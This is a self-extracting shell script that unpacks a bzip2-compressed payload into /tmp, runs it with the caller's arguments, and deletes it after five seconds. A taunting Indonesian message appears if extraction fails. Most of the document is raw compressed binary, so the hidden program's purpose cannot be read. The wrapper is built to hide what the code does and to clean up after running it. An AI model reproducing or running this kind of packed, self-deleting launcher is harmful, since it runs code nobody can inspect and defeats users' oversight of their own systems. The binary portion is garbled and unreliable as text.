#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? $0; exit 1
fi; exit $res
BZh91AY&SY4�K� _� ����?�������`/�{�����$D��#Bi���i��Q� 054���h'�1�hF�    �F�142a4��4ɡ�@a"��F�3��<���6(���CA�=F�h  q��LML�M2C@h2h`�H��&��"zOi6����ď$��='��6��\�͋�յ�7�{�%�CJ&�Θ�|Bj�C�UX�7M��9aA������΢���f;i�Uv˻�ѝt��"\~��AѶ�R�6r���2���"����0R��Б�,V������m��D����~��D��!�^M%/[$zP@�-u�oh0� S�� �����g�l<۴ߥ��cx3�mџ|s%9O/D���&��s�R]�-���C]e�'��C� ���me;l	ҍ���+Ў3r�����>����c�S�@n���t�*.B?�lv�4ų��*�����<���B�bp�8�ޤ��@����ѹ�%��-�و���(b�sf�t#5IQmD���<�����-��hG�*�%��!
�PEMJk��NSZdC*R�H��Rt�K{��9��Ko��0��M�=��`��8���`�����f����m#U��%x뎟P��}J��4bU�Ҭ�*"�O���[i�-�S��BUj&ro�BP6�<CC� �9,/���m��m?H���X`���`]R�TӎtcCm������@�&Z�
��r��|�f˛��)���GwI��,������H�����Fd�(�I`=g���	������AeҴ�F:���L�a�8?�h�Z�^$s�B��Y@��>V�1���A�
ο�������a�,1^bв��QRJ��(�V|
L�йo*w�
�'M�?.�5�gr�a:��H���~D��9�Xubb&�%w�#�����a����`��//93�%�`u��T��A�ŦB��k7�p_z%�� It5BLd�	��.���м�y�t=��8���6�|�7�I���^�y�����V�b�]V�J�� /8Q/�VA���6�f�-g6rYR%9ND��V(2㝊Y��)�� �M��ɴ�pV�\�fl&A�2Cϻ�$�4<�Y2�1�K�r;=���
4g�JhF��ZA�pH�E�S�մ�\�@,� t�CK�/-<C.V�W���2�zNd���T�����`a�|֒ ���h�F/���e��֔�2�pW�o�D�dp�Ad�Z��j-� �@�Tddj>�6��RgIw�/�C�U�z5�b���/���j��0�1����C�(l>el���AU����4�1�����Lf!W	�Qex�b�	��p�ػ�q�,�C�S5	 �`&*�H-����vc�O�R�(�:V��ԾҤ��ݢ&hzI�b����9)�$"	W������Dk0.�{
�y�'1۲�jL�d�T]��b1dXz���W(�{OH�挋{���Y��M��z�.���<z/5 ��X$h2���%���Ȇd�Qf7��V�(��J�1r����(Y$j�K*���.U@�K��_j�Ե���6x��!l�<�E��&f�[A�=�@�{͐9��m����i
AE���r$�q��u"!Ԡ��c#�/gm2Ґ�j���]BL$;�6���Ni�4"մ�@-N�B�,�)oM-�p4���6�Ӈ)S�&A�&�$2f�j�p�R���UP���v;6��c(d�$dA�KA��y��`me�A�$�
��!��������a���p5`g]21�<%���Z�Z��,:֕"�!�ؠ�g����gW"$�3��)Giz����_̲����|��r=R�
���H�
�ix 